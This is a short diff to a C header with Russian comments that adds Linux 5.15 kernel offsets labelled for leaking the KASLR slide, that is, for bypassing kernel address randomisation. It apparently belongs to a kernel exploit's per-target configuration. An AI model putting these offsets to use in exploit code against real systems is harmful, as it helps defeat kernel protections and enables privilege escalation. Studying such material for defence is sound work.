@@ -211,5 +211,15 @@
 /* copy_splice_read_off равен 0 из-за инлайнинга в 5.15 */
 #define COPY_SPLICE_READ_OFF               0ULL
 
+/* ------------------------------------------- KASLR slide leak offsets ------- 
+ * Алиасы для подсистемы обхода рандомизации адресов ядра ядра 5.15
+ */
+#define SLIDE_SYSCTL_BOOTID_OFF            0x02DD6819ULL
+#define SLIDE_LOGGERS_0_1_OFF              0x02B11D68ULL
+#define SLIDE_NFULNL_LOGGER_OFF            0x02B11E30ULL
+
+/* В ядрах 5.15 этот метод поиска отсутствует или объединен с boot_id, ставим 0 */
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF      0ULL
+
 
 #endif /* TARGET_H */
